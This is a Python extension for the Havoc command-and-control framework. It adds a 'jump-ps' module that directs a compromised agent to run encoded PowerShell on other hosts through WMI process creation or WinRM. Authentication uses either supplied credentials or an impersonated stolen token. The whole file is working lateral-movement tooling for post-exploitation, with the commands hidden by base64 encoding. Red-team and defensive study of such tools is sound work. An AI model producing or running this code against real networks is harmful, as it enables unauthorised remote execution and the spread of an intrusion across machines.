## Simple Havoc extension for lateral movenet trough powershell, both with credentials or stolen token
from havoc import Demon, RegisterCommand, RegisterModule
import base64



def encode_cmd(cmd):
    utf16le_data = cmd.encode('utf-16le')
    b64_data = base64.b64encode(utf16le_data).decode('utf-8')
    return b64_data


def wmi_powershell( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )


    num_params = len(params)

    target     = ''
    username   = ''
    password   = ''
    command    = ''

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    target = params [ 0 ]
    command = params[ 1 ]

    if num_params == 4:
        username = params[ 2 ]
        password = params[ 3 ]
        invoke_wmi = f"""$credential = New-Object System.Management.Automation.PSCredential ('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force)); Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe /enc {encode_cmd(command)}" -ComputerName {target} -Credential $credential"""
        TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run \"{command}\" on {target} via wmi with creds: {username}:{password}" )
        demon.Command( TaskID, f"powershell /enc {encode_cmd(invoke_wmi)}" )
        return TaskID
    else:
        invoke_wmi_token = f"""Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe /enc {encode_cmd(command)}" -ComputerName {target}"""
        TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run {command} on {target} via wmi, impersonated token will be used" )
        demon.Command( TaskID, f"powershell /enc {encode_cmd(invoke_wmi_token)}" )
        return TaskID



def winrm_powershell( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )


    num_params = len(params)

    target     = ''
    username   = ''
    password   = ''
    command    = ''

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    target = params [ 0 ]
    command = params[ 1 ]

    if num_params == 4:
        username = params[ 2 ]
        password = params[ 3 ]
        invoke_winrm = f"""$credential = New-Object System.Management.Automation.PSCredential ('{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force)); Invoke-Command -ScriptBlock {{ {command} }} -ComputerName {target} -Credential $credential"""
        TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run \"{command}\" on {target} via WinRM with creds: {username}:{password}" )
        demon.Command( TaskID, f"powershell /enc {encode_cmd(invoke_winrm)}" )
        return TaskID
    else:
        invoke_winrm_token = f"""Invoke-Command -ScriptBlock {{ {command} }} -ComputerName {target}"""
        TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run {command} on {target} via WinRM, impersonated token will be used" )
        demon.Command( TaskID, f"powershell /enc {encode_cmd(invoke_winrm_token)}" )
        return TaskID


RegisterModule( "jump-ps", "PowerShell lateral movement module", "", "[exploit] (args)", "", ""  )
RegisterCommand( wmi_powershell, "jump-ps", "wmi", "Make use of powershell's Invoke-WmiMethod, with supplied credentials or impersonated token", 0, "target command username password", "10.10.10.10 \"iwr localhost\" <opt:user1> <opt:pass1>" )
RegisterCommand( winrm_powershell, "jump-ps", "winrm", "Make use of powershell's Invoke-Command, with supplied credentials or impersonated token", 0, "target command username password", "10.10.10.10 \"iwr localhost\" <opt:user1> <opt:pass1>")